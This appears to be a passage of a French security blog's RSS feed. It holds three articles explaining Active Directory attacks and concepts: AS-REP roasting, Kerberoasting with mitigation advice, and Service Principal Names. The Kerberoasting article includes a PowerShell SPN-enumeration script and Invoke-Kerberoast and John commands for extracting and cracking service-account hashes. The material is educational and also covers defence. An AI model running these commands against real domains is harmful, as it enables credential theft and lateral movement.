        <description>&lt;p&gt;Lors d’une demande de TGT, l’utilisateur doit, par défaut, s’authentifier auprès du KDC pour que celui-ci lui réponde. Il arrive que cette authentification préalable ne soit pas demandée pour certains comptes, permettant à un attaquant d’abuser de cette configuration.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;préambule&quot;&gt;Préambule&lt;/h2&gt;

&lt;p&gt;Lorsque nous parlons de la notion de TGT, c’est souvent un abus de langage, car nous parlons en fait du &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt; qui contient le TGT (chiffré par le secret du KDC) et la clé de session (chiffrée avec le secret du compte utilisateur).&lt;/p&gt;

&lt;p&gt;Ainsi, dans cet article, la notion de TGT fait seulement référence au TGT contenu dans la réponse &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;pré-authentification&quot;&gt;Pré-authentification&lt;/h2&gt;

&lt;p&gt;Lorsque nous avons parlé du &lt;a href=&quot;https://beta.hackndo.com/kerberos&quot;&gt;fonctionnement de Kerberos&lt;/a&gt;, il a été mis en évidence que dans le premier échange (&lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_AS_REQ&lt;/a&gt; - &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt;), le client doit d’abord s’authentifier auprès du KDC avant d’obtenir un TGT. Une partie de la réponse du KDC étant chiffrée avec le secret du compte client (la clé de session), il est important que cette information ne soit pas accessible sans authentification. Dans le cas échéant n’importe qui pourrait demander un TGT pour un compte donné, et tenter de décrypter  la partie chiffrée de la réponse &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt; pour retrouver le mot de passe de l’utilisateur ciblé.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2018/05/asrep.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2018/05/asrep.png&quot; alt=&quot;KRB_AS_REP&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;C’est pourquoi le client doit, dans sa requête &lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_AS_REQ&lt;/a&gt;, envoyer un authentifiant qu’il chiffre avec son secret afin que le KDC le déchiffre et renvoie le &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt; en cas de succès. Si jamais un attaquant demande un TGT pour un compte qu’il ne contrôle pas, il ne sera pas en mesure de chiffrer l’authentifiant de la bonne façon, donc le KDC ne renverra pas les informations attendues.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/asreqroast_auth.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/asreqroast_auth.png&quot; alt=&quot;Authentication Required&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ce comportement est celui par défaut, il protège les comptes contre cette attaque hors-ligne.&lt;/p&gt;

&lt;h2 id=&quot;krb_as_rep-roasting&quot;&gt;KRB_AS_REP Roasting&lt;/h2&gt;

&lt;p&gt;Cependant, pour différentes raisons (obscures quand même), il est possible de désactiver le prérequis de pré-authentification pour un ou plusieurs compte(s).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/preauthsettings.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/preauthsettings.png&quot; alt=&quot;Preauthentication Setting&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Par exemple dans &lt;a href=&quot;https://laurentschneider.com/wordpress/2014/01/the-long-long-route-to-kerberos.html&quot;&gt;cet article&lt;/a&gt;, l’auteur indique que pour bénéficier du SSO sur une base de données hébergée sur un serveur Unix, il doit désactiver la pré-authentification sur l’utilisateur. Cela reste un cas très rare, et même &lt;a href=&quot;https://twitter.com/cptjesus&quot;&gt;cptjesus&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Harmj0y&lt;/a&gt; n’ont pas vraiment de réponse.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;cptjesus &amp;gt; As far as why its disabled, I couldn’t tell you&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Harmj0y &amp;gt; I honestly don’t really know why it would be disabled, just have heard from a people about the linux/“old” angle.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Quoiqu’il en soit, si cette option est désactivée, n’importe qui peut demander un TGT au nom d’un de ces comptes, sans envoyer d’authentifiant, et le KDC renverra un &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt; au demandeur.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/asreqroast_no_auth.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/asreqroast_no_auth.png&quot; alt=&quot;Authentication Required&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cela peut se faire avec l’outil &lt;a href=&quot;https://github.com/HarmJ0y/ASREPRoast&quot;&gt;ASREPRoast&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@Harmj0y&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/attackasrep.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/attackasrep.png&quot; alt=&quot;ASREPRoast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une fois en possession de la réponse du KDC &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_AS_REP&lt;/a&gt;, l’attaquant peut tenter de trouver en mode hors-ligne le mot de passe en clair de la victime ciblée, par exemple en utilisant John The Ripper avec le format &lt;code class=&quot;highlighter-rouge&quot;&gt;krb5tgs&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Cette technique, décrite dans un &lt;a href=&quot;https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/&quot;&gt;article&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Harmj0y&lt;/a&gt;, est un moyen parmi beaucoup de récupérer des mots de passe en clair au sein d’un environnement Active Directory. Si des comptes à privilèges sont paramétrés pour ne pas nécessiter une pré-authentification, un attaquant peut simplement requêter un TGT pour ce compte et tenter de retrouver en mode hors-ligne le mot de passe du compte. Avec des machines puissantes, la vitesse de cracking peut devenir colossale. Notons cependant que les comptes n’ayant pas de pré-authentification nécessaire sont rares. Ils peuvent exister pour des raisons historiques, mais cette technique reste moins généralisable que le &lt;a href=&quot;/kerberoasting&quot;&gt;kerberoasting&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 22 Mar 2019 08:10:06 +0100</pubDate>
        <link>http://localhost:4000//kerberos-asrep-roasting/</link>
        <guid isPermaLink="true">http://localhost:4000//kerberos-asrep-roasting/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>Kerberoasting</title>
        <description>&lt;p&gt;A l’aide des notions abordées précédemment, nous avons tous les éléments en main pour expliquer le principe de l’attaque &lt;strong&gt;Kerberoasting&lt;/strong&gt;, basée sur la demande de TGS et sur les attributs &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; de comptes d’Active Directory.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;principe&quot;&gt;Principe&lt;/h2&gt;

&lt;p&gt;L’article sur le &lt;a href=&quot;/kerberos&quot;&gt;fonctionnement de kerberos&lt;/a&gt; a permis de comprendre comment un utilisateur demandait un TGS auprès du contrôleur de domaine. La réponse &lt;a href=&quot;/kerberos/#krb_tgs_rep&quot;&gt;KRB_TGS_REP&lt;/a&gt; est composée de deux parties. Une première partie est le TGS dont le contenu est chiffré avec le secret du service demandé, et une deuxième partie est une clé de session qui sera utilisée entre l’utilisateur et le service. Le tout est chiffré avec le secret de l’utilisateur.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2018/05/tgsrep.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2018/05/tgsrep.png&quot; alt=&quot;Ticket pour le service&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Un utilisateur de l’Active Directory peut demander un TGS pour n’importe quel service auprès du KDC. En effet, ce dernier n’a pas pour rôle de vérifier les droits du demandeur. Il a seulement pour rôle de fournir les informations de sécurité liées à l’utilisateur (via le &lt;a href=&quot;/kerberos-silver-golden-tickets/#pac&quot;&gt;PAC&lt;/a&gt;). C’est le service qui doit vérifier les droits de l’utilisateur en lisant son PAC dont une copie est fournie dans le TGS.&lt;/p&gt;

&lt;p&gt;Ainsi, il est possible d’effectuer des demandes de TGS en indiquant des &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; arbitraires, et si ces &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; sont enregistrés dans l’Active Directory, le KDC fournira un morceau d’information chiffré avec la clé secrète du compte exécutant le service. L’attaquant peut, avec cette information, tenter de trouver le mot de passe en clair du compte via une attaque par exhausitivité (brute force).&lt;/p&gt;

&lt;p&gt;Heureusement, la plupart des comptes qui exécutent les services sont les comptes machines (sous la forme &lt;code class=&quot;highlighter-rouge&quot;&gt;NOMDEMACHINE$&lt;/code&gt;) et leurs mots de passe sont très longs et aléatoires, donc ils ne sont pas vraiment vulnérables à ce type d’attaque. Il existe cependant des services qui sont exécutés par des comptes de services avec des mots de passe choisis par des humains. Ce sont ces comptes qui sont bien plus simples à compromettre via des attaques de type brute-force, donc ce sont ces comptes qui seront visés dans une attaque &lt;strong&gt;Kerberoast&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Afin de lister ces comptes, un filtre LDAP peut être utilisé afin d’extraire les comptes de type utilisateur possédant un attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;servicePrincipalName&lt;/code&gt; non vide. Ce filtre est le suivant :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Voici alors un script simple en PowerShell qui permet de récupérer les utilisateurs avec au moins un &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; :&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DirectoryServices.DirectorySearcher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;ADSI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(&amp;amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetDirectoryEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User : &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;distinguishedName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SPNs&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        
	&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;servicePrincipalName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
		&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dans le lab, un faux &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; a été placé sur l’utilisateur “support account”.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/03/SPNOnUser.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/03/SPNOnUser.png&quot; alt=&quot;SPN on User&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ainsi, lors de la recherche LDAP, voici ce que ça donne :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/03/SPNListUsersPowershell.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/03/SPNListUsersPowershell.png&quot; alt=&quot;SPN MapListpings&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bien entendu, il existe plusieurs outils permettant d’automatiser cette tâche. Je citerai ici l’outil &lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1&quot;&gt;Invoke-Kerberoast.ps1&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@Harmj0y&lt;/a&gt;, outil qui s’occupe de lister les comptes utilisateurs avec un ou plusieurs &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt;, effectuer des demandes de TGS pour ces comptes et extraire la partie chiffrée dans un format qui peut être cracké (par John par exemple).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-Kerberoast -domain adsec.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On espère alors trouver des mots de passe, ce qui dépend de la politique de mot de passe de l’entreprise pour ces comptes.&lt;/p&gt;

&lt;h2 id=&quot;protection&quot;&gt;Protection&lt;/h2&gt;

&lt;p&gt;Pour se protéger de ce type d’attaque, il faut éviter d’avoir des &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; sur des comptes utilisateurs, au profit des comptes machines.&lt;/p&gt;

&lt;p&gt;Si c’est vraiment nécessaire, alors il faut utiliser la fonctionnalité “Managed Service Accounts” (MSA) de Microsoft qui permet de faire en sorte que le mot de passe du compte soit robuste et changé régulièrement et automatiquement. Pour cela, il suffit d’ajouter un compte de service (seulement via PowerShell) :&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;New-ADServiceAccount&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sql-service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Puis il convient de l’installer sur la machine&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Install-ADServiceAccount&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sql-service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enfin, il faut assigner cet utilisateur au service.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/set-account-service.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/set-account-service.png&quot; alt=&quot;Assignation du compte de service&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;L’attaque Kerberoast permet de récupérer de nouveaux comptes au sein d’un Active Directory pour une tentative de mouvement latéral. Les comptes alors compromis peuvent avoir des droits plus élevés, ce qui est parfois le cas sur la machine qui héberge le service. Il est alors important d’un point de vue défensif de maîtriser l’attribut &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; des comptes de domaine pour éviter que des comptes à mot de passe faible soient vulnérables à cette attaque.&lt;/p&gt;
</description>
        <pubDate>Fri, 15 Mar 2019 09:02:44 +0100</pubDate>
        <link>http://localhost:4000//kerberoasting/</link>
        <guid isPermaLink="true">http://localhost:4000//kerberoasting/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>Service Principal Name (SPN)</title>
        <description>&lt;p&gt;Pour la suite des articles, la notion de SPN (Service Principal Name) va être abordée. Cet article permet de faire un point sur cette notion afin de comprendre ce que sont ces “SPN”, à quoi ils servent et comment ils sont utilisés.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;quest-ce-quun-spn&quot;&gt;Qu’est-ce qu’un SPN&lt;/h2&gt;

&lt;p&gt;Nous nous plaçons dans un environnement Active Directory. Pour comprendre la notion de SPN, il faut comprendre ce qu’est la notion de service au sein d’un active directory.&lt;/p&gt;

&lt;p&gt;Un service est en fait une fonctionnalité, un logiciel, quelque chose qui peut être utilisé par d’autres membres de l’AD (Active Directory). On peut avoir par exemple un serveur web, un partage réseau, un service DNS, un service d’impression, etc. Pour identifier un service, nous avons besoin de deux éléments à minima. Le même service peut tourner sur différentes machines, donc il faut spécifier &lt;strong&gt;la machine&lt;/strong&gt;, et une machine peut héberger plusieurs services, donc il faut, évidemment, spécifier &lt;strong&gt;le service&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;C’est en combinant ces informations que nous pouvons désigner un service de manière précise. Cette combinaison représente son &lt;strong&gt;Service Principal Name&lt;/strong&gt;, ou &lt;strong&gt;SPN&lt;/strong&gt;. Il se présente de la sorte :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;classe_du_service/hostname_ou_FQDN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La classe du service est en fait un nom un peu générique qui correspond au service. Par exemple, tous les serveurs web sont regroupés dans la classe “www”, les services SQL sont dans la classe “SqlServer” etc.&lt;/p&gt;

&lt;p&gt;Si jamais le service présente un port particulier, ou si on veut le préciser pour éviter toute ambiguïté, il est possible de l’ajouter à la fin :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;classe_du_service/hostname_ou_FQDN:port
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enfin, un nom peut être donné au SPN, mais c’est tout à fait arbitraire et optionnel.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;classe_du_service/hostname_ou_FQDN:port/nom_arbitraire
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ainsi, dans mon Active Directory, j’ai deux machines proposant des services web, &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-02&lt;/code&gt;, et chacune de ces deux machines propose d’autres services.&lt;/p&gt;

&lt;p&gt;Si je veux désigner le serveur web sur &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt;, le SPN se présente de la façon suivante :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www/WEB-SERVER-01
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ou&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www/WEB-SERVER-01.adsec.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dans la vraie vie, voici le SPN d’un service dans un ticket Kerberos :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/SPN_ST.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/SPN_ST.png&quot; alt=&quot;SPN&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ce ticket est destiné à l’utilisation du service &lt;code class=&quot;highlighter-rouge&quot;&gt;www&lt;/code&gt; sur la machine &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt; dans le domaine &lt;code class=&quot;highlighter-rouge&quot;&gt;adsec.local&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;exemples&quot;&gt;Exemples&lt;/h2&gt;

&lt;p&gt;Il existe un grand nombre de classes de services, en voici une liste built-in tirée de la &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names&quot;&gt;documentation de Microsoft&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/liste_spn.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/liste_spn.png&quot; alt=&quot;Liste SPN&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nous reconnaissons quelques classes de services, telles que &lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS&lt;/code&gt; pour les services en lien avec le partage de fichiers, &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;WWW&lt;/code&gt; dont nous avons déjà parlé, ou encore &lt;code class=&quot;highlighter-rouge&quot;&gt;spooler&lt;/code&gt; qui regroupe les services d’impression.&lt;/p&gt;

&lt;p&gt;Cette liste n’est pas exhaustive, on ne retrouve par exemple pas de &lt;code class=&quot;highlighter-rouge&quot;&gt;SqlServer&lt;/code&gt; que l’on recontre habituellement dans les environnements AD, ou encore la classe &lt;code class=&quot;highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; qui réunit les services d’annuaire.&lt;/p&gt;

&lt;h2 id=&quot;cas-particulier---host&quot;&gt;Cas particulier - HOST&lt;/h2&gt;

&lt;p&gt;Il existe un cas particulier que nous rencontrons dans les attributs SPN d’un objet dans l’AD, c’est le SPN &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/host_spn.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/host_spn.png&quot; alt=&quot;HOST SPN&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Le SPN &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt; n’est pas vraiment une classe de service. C’est un SPN qui est un regroupement de classes de services, une sorte d’alias qui regroupe un grand nombre de SPN. Les éléments qu’il regroupe sont définis dans l’attribut “SPN-Mappings” de l’AD. On peut énumérer ces classes via la commande suivante :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-ADObject -Identity &quot;CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=HALO,DC=NET&quot; -properties sPNMappings
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/sPNMappings.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/sPNMappings.png&quot; alt=&quot;SPN Mappings&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

